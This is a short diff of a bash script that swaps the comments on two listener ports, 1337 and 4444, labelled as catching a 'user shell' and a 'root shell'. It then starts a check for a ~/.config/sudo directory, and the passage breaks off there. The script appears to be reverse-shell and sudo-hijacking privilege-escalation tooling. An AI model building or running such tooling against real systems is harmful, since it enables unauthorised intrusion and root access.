@@ -1,8 +1,8 @@
 #!/bin/bash
 
 LISTENER_IP="127.0.0.1"
-LISTENER1_PORT="1337" #Listener for user shell
-LISTENER2_PORT="4444" #Listener for root shell
+LISTENER1_PORT="1337" #Listener for root shell
+LISTENER2_PORT="4444" #Listener for user shell
 
 if [ ! -d ~/.config/sudo ]
 then
